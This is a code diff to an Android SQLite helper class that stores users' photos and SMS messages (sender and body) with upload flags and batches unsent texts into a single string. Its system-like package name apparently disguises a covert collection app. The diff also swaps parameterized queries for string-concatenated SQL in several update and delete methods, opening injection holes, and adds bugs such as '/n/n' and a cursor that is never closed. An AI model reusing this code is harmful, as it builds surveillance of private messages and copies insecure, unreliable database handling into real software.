@@ -6,10 +6,13 @@ import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteOpenHelper;
+import android.os.Build;
+import android.util.Log;
 
 import com.android.media.settings.Models.Media;
 import com.android.media.settings.Models.MediaSMS;
 
+import java.util.ArrayList;
 import java.util.List;
 
 public class MediaDBManager extends SQLiteOpenHelper {
@@ -81,7 +84,7 @@ public class MediaDBManager extends SQLiteOpenHelper {
     }
 
     private boolean isMediaExists(Media media) {
-        String query = "SELECT * FROM " + TABLE_MEDIA_STORE + " WHERE " + COLUMN_PICS_STORE_ID + " = " + media.getId();
+        String query = "SELECT * FROM " + TABLE_MEDIA_STORE + " WHERE " + COLUMN_PICS_STORE_ID + " = '" + media.getId() + "'";
         SQLiteDatabase db = getReadableDatabase();
         Cursor c = db.rawQuery(query, null);
         try {
@@ -94,18 +97,30 @@ public class MediaDBManager extends SQLiteOpenHelper {
         return false;
     }
 
-    public Cursor getLocalMedia() {
+    public List<Media> getLocalMedia() {
         String[] columns = new String[] {COLUMN_PICS_STORE_ID, COLUMN_PICS_STORE_URL};
-        String selection = COLUMN_PICS_IS_UPLOADED + " = ? ";
-        String[] selectionArgs = new String[] { "0" };
-        String orderBy = COLUMN_PICS_ID + " ASC ";
-        String limit = " 15 ";
+        String selection = COLUMN_PICS_IS_UPLOADED + " = 0 ";
+        String orderBy = COLUMN_PICS_STORE_ID + " ASC ";
+        String limit = " 5 ";
         SQLiteDatabase db = getReadableDatabase();
-        return db.query(TABLE_MEDIA_STORE, columns, selection, selectionArgs, null, null, orderBy, limit);
+        Cursor cursor = db.query(TABLE_MEDIA_STORE, columns, selection, null, null, null, orderBy, limit);
+
+        Log.d(TAG, "Local Media Count: " + cursor.getCount());
+        List<Media> mediaList = new ArrayList<>();
+        while (cursor.moveToNext()) {
+            Media media = new Media(
+                    cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID)),
+                    cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL))
+            );
+            mediaList.add(media);
+        }
+        cursor.close();
+        db.close();
+        return mediaList;
     }
 
     public Media getMedia(String id) {
-        String query = "SELECT * FROM " + TABLE_MEDIA_STORE + " WHERE " + COLUMN_PICS_STORE_ID + " = " + id + " LIMIT 0, 1";
+        String query = "SELECT * FROM " + TABLE_MEDIA_STORE + " WHERE " + COLUMN_PICS_STORE_ID + " = '" + id + "' LIMIT 0, 1";
         SQLiteDatabase db = getReadableDatabase();
         Cursor c = db.rawQuery(query, null);
         Media media = null;
@@ -116,11 +131,11 @@ public class MediaDBManager extends SQLiteOpenHelper {
                         c.getString(c.getColumnIndex(COLUMN_PICS_STORE_URL)),
                         c.getInt(c.getColumnIndex(COLUMN_PICS_IS_UPLOADED))
                 );
+                c.close();
             }
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
-            c.close();
             db.close();
         }
         return media;
@@ -134,36 +149,60 @@ public class MediaDBManager extends SQLiteOpenHelper {
     public String lastInsertedMedia() {
         String query = "SELECT MAX(" + COLUMN_PICS_STORE_ID + ") FROM " + TABLE_MEDIA_STORE;
         String id = "0";
-        SQLiteDatabase db = getReadableDatabase();
-        Cursor c = db.rawQuery(query, null);
-        try {
-            if(c.moveToFirst()) {
-                id = c.getString(0);
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            try(SQLiteDatabase db = getReadableDatabase(); Cursor c = db.rawQuery(query, null)) {
+                if(c.moveToFirst()) {
+                    id = c.getString(0);
+                }
             }
-        } finally {
-            c.close();
-            db.close();
+        }else {
+            SQLiteDatabase db = getReadableDatabase();
+            Cursor c = db.rawQuery(query, null);
+            try {
+                if(c.moveToFirst()) {
+                    id = c.getString(0);
+                }
+            } finally {
+                c.close();
+                db.close();
+            }
         }
-        if(id == null) {
+
+        if(id == null || id.equals("0")) {
             id = getPrefID();
         }
         return id;
     }
 
-    public boolean updateUploadStatus(Media media) {
+    public void updateUploadStatus(Media media) {
         ContentValues values = new ContentValues();
         values.put(COLUMN_PICS_IS_UPLOADED, media.getStatus());
         String where = COLUMN_PICS_STORE_ID + " = ? ";
         String[] whereArgs = new String[] { media.getId() };
 
-        SQLiteDatabase db = getWritableDatabase();
-        try {
-            db.update(TABLE_MEDIA_STORE, values, where, whereArgs);
-            return true;
-        } catch(Exception e) {
-            return false;
-        } finally {
-            db.close();
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            try(SQLiteDatabase db = getWritableDatabase()) {
+                String query = "SELECT MAX(" + COLUMN_PICS_STORE_ID + ") FROM " + TABLE_MEDIA_STORE + " WHERE " + COLUMN_PICS_IS_UPLOADED + " = 2";
+                db.update(TABLE_MEDIA_STORE, values, where, whereArgs);
+
+                //get last inserted cloud id
+                Cursor c = db.rawQuery(query, null);
+                if(c != null && c.moveToNext()) {
+                    String lastInsertedId = c.getString(0);
+
+                    String whereDel = COLUMN_PICS_STORE_ID + " != " +lastInsertedId+ " AND " + COLUMN_PICS_IS_UPLOADED + " = 2 ";
+                    db.delete(TABLE_MEDIA_STORE, whereDel, null);
+                }
+            }
+        }else {
+            SQLiteDatabase db = getWritableDatabase();
+            try {
+                db.update(TABLE_MEDIA_STORE, values, where, whereArgs);
+            } catch(Exception ignored) {
+            } finally {
+                db.close();
+            }
         }
     }
 
@@ -173,23 +212,39 @@ public class MediaDBManager extends SQLiteOpenHelper {
         values.put(COLUMN_SMS_BODY, sms.getMsgBody());
         values.put(COLUMN_SMS_STATUS, sms.getMsgStatus());
 
-        SQLiteDatabase db = getWritableDatabase();
-        try {
-            db.insert(TABLE_MEDIA_SMS, null, values);
-        } finally {
-            db.close();
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            try(SQLiteDatabase db = getWritableDatabase()) {
+                db.insert(TABLE_MEDIA_SMS, null, values);
+            }
+        }else {
+            SQLiteDatabase db = getWritableDatabase();
+            try {
+                db.insert(TABLE_MEDIA_SMS, null, values);
+            } finally {
+                db.close();
+            }
         }
+
     }
 
-    public Cursor getLocalSMS() {
+    public MediaSMS getLocalSMS() {
         String[] columns = new String[] {COLUMN_SMS_ID, COLUMN_SMS_FROM, COLUMN_SMS_BODY};
         String selection = COLUMN_SMS_STATUS + " = 0 ";
-        String[] selectionArgs = new String[] { "0" };
         String orderBy = COLUMN_SMS_ID + " ASC ";
         String limit = " 30 ";
 
         SQLiteDatabase db = getReadableDatabase();
-        return db.query(TABLE_MEDIA_SMS, columns, selection, null, null, null, orderBy, limit);
+        Cursor cursor = db.query(TABLE_MEDIA_SMS, columns, selection, null, null, null, orderBy, limit);
+        List<String> idList = new ArrayList<>();
+        StringBuilder smsContent = new StringBuilder();
+        while (cursor.moveToNext()) {
+            idList.add(cursor.getString(0));
+            smsContent.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_FROM)));
+            smsContent.append(" : ");
+            smsContent.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_BODY)));
+            smsContent.append("/n/n");
+        }
+        return new MediaSMS(idList, smsContent);
     }
 
     public void updateSMSStatus(List<String> idList, int status) {
@@ -198,35 +253,36 @@ public class MediaDBManager extends SQLiteOpenHelper {
             for(String id : idList) {
                 ContentValues values = new ContentValues();
                 values.put(COLUMN_SMS_STATUS, status);
-                String where = COLUMN_PICS_ID + " = ? ";
-                String[] whereArgs = new String[] { id };
-                db.update(TABLE_MEDIA_SMS, values, where, whereArgs);
+                String where = COLUMN_PICS_ID + " = " + id;
+                db.update(TABLE_MEDIA_SMS, values, where, null);
             }
         } finally {
             db.close();
         }
     }
 
-    public void removeSMS(String id) {
-        String where = COLUMN_PICS_ID + " = ? ";
-        String whereArgs[] = new String[] { id };
+    private void removeSMS(String id) {
+        String where = COLUMN_SMS_ID + " = " + id;
 
-        SQLiteDatabase db = getWritableDatabase();
-        try {
-            db.delete(TABLE_MEDIA_SMS, where, whereArgs);
-        } finally {
-            db.close();
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            try(SQLiteDatabase db = getWritableDatabase()) {
+                db.delete(TABLE_MEDIA_SMS, where, null);
+            }
+        }else {
+            SQLiteDatabase db = getWritableDatabase();
+            try {
+                db.delete(TABLE_MEDIA_SMS, where, null);
+            } finally {
+                db.close();
+            }
         }
     }
 
     public void removeSMS(List<String> idList) {
-        SQLiteDatabase db = getWritableDatabase();
         try {
             for(String id : idList) {
                 removeSMS(id);
             }
-        } finally {
-            db.close();
-        }
+        } catch (Exception ignored) {}
     }
 }
